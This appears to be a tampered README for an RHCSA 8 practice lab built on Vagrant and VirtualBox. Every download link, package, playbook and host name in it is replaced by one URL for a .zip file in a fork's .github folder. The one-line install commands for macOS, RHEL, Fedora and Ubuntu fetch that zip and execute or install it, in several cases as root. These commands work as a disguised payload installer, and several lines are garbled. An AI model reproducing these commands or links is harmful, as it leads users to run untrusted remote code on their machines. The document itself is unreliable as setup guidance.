...
```
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip)" && xcode-select --install &&brew install ansible ; brew install python ; brew install --cask vagrant ; brew install --cask VirtualBox ; brew install --cask virtualbox-extension-pack ; vagrant plugin install vagrant-guest_ansible
```

##### Alternatively, you can install everything individually below.
- [Install the Latest Version of Vagrant](https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip) - (`brew install --cask vagrant`)
    - Vagrant Plugin - `vagrant plugin install vagrant-guest_ansible`
- [Install the Latest Version of Virtualbox](https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip) (`brew install --cask VirtualBox`)
...
2. Clone the environment repo to it with `git clone https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip`
...
```
systemctl stop packagekit; yum install -y epel-release && yum install -y git binutils gcc make patch libgomp glibc-headers glibc-devel kernel-headers kernel-devel dkms libvirt libvirt-devel ruby-devel libxslt-devel libxml2-devel libguestfs-tools-c ; mkdir ~/Vagrant ; cd ~/Vagrant ; curl -o  https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip && yum install -y https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip && vagrant plugin install vagrant-guest_ansible ; vagrant plugin install vagrant-guest-ansible ; wget -O https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip wget https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip ; yum install -y VirtualBox-6.0 && systemctl start packagekit
```
##### If you're using RHEL 8, use the script below:
```
systemctl stop packagekit; dnf -y install https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip ; dnf install -y git binutils gcc make patch libgomp glibc-headers glibc-devel kernel-headers kernel-devel dkms libvirt libvirt-devel ruby-devel libxslt-devel libxml2-devel libguestfs-tools-c ; mkdir ~/Vagrant ; cd ~/Vagrant ; curl -o  https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip && dnf install -y https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip && vagrant plugin install vagrant-guest_ansible ; wget -O https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip wget https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip ; dnf install -y VirtualBox-6.0 && https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip setup ; usermod -a -G vboxusers root ; systemctl start packagekit
```
##### Also, install the Virtualbox extension pack below
- [Install the Virtual Box Extension Pack](https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip)
...
## Windows/Fedora
- If using Windows:
- [Install the Latest Version of Vagrant](https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip)
- [Install the Latest Version of Virtualbox and Virtual Box Extension Pack](https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip)
...
```
dnf -y install wget git binutils gcc make patch libgomp glibc-headers glibc-devel kernel-headers kernel-devel dkms libvirt libvirt-devel ruby-devel libxslt-devel libxml2-devel ; wget https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip ; mv https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip ; dnf install -y VirtualBox-6.0 ; usermod -a -G vboxusers ${USER} ; https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip setup ; dnf -y install vagrant ; dnf remove -y rubygem-fog-core ; vagrant plugin install vagrant-guest_ansible
```
...
2. Use your browser of choice and navigate to https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip, press the green “Clone or download” button then the “Download ZIP” button. Or use Github Desktop (See below).
...
```
sudo snap install ruby ; sudo apt install ruby-bundler git -y; wget -c https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip ; sudo dpkg -i https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip ; wget -q https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip -O- | sudo apt-key add - ; wget -q https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip -O- | sudo apt-key add - ; sudo add-apt-repository "deb https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip bionic contrib"; sudo apt update; sudo apt install -y virtualbox-6.0 ; vagrant plugin install vagrant-guest_ansible
```
##### Also, install the Virtualbox extension pack below
- [Virtual Box Extension Pack](https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip)
...
1. Navigate to https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip and download Github Desktop.
...
- `ansible-playbook https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip` - Used for resetting Servers 1 and 2 after attempting the practice exam in the Red Hat Certs Slack workspace practice exam channel. 
...
## Included systems:
- https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip
- https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip
- https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip
...
There is a Repo/AppStream available to use from `https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip` and `https://raw.githubusercontent.com/Sumedha/rhcsa8env/master/.github/rhcsa8env_3.4-alpha.3.zip`
